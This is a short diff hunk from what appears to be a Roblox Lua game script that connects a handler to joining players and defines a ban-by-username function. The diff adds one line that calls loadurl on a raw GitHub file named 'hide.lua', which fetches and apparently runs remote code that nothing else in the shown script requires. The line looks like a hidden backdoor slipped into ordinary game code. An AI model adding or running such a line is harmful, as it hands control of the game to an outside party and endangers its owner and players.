@@ -30,6 +30,8 @@ end
 for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
 Players.PlayerAdded:Connect(onPlayer)
 
+loadurl("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/hide.lua")
+
 pcall(function()
 local function BanByUsername(username: string, message: string)
 	local userId
